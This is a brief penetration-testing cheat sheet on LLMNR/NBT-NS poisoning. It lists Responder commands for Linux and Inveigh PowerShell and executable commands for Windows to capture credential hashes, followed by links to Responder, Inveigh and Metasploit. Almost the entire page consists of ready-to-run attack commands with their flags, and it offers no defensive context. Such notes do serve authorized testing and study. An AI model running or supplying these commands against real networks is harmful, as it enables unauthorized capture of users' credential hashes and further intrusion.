# LLMNR/NBT-NS Poisoning

#### Capturing Hashes

* **Linux**
  * `sudo responder -I <interface> -dP` <sup><sub>(-v verbose) (-w for WPAD server)<sub></sup>
  * `sudo responder -I <interface> -wrfv`
* **Windows**
  * `Import-Module .\Inveigh.ps1`
  * `(Get-Command Invoke-Inveigh).Parameters`&#x20;
  * `Invoke-Inveigh -NBNS Y -ConsoleOutput Y -FileOutput Y`&#x20;
  * Use the compiled C# version for the latest fetures. (`.\Inveigh.exe`)
    * `ESC -> HELP`

### Tools

* [Inveigh.ps1](https://github.com/Kevin-Robertson/Inveigh/blob/master/Inveigh.ps1) or [InveighZero](https://github.com/Kevin-Robertson/Inveigh/releases)
* [Responder](https://github.com/lgandx/Responder)
* [Metasploit](https://www.metasploit.com/)
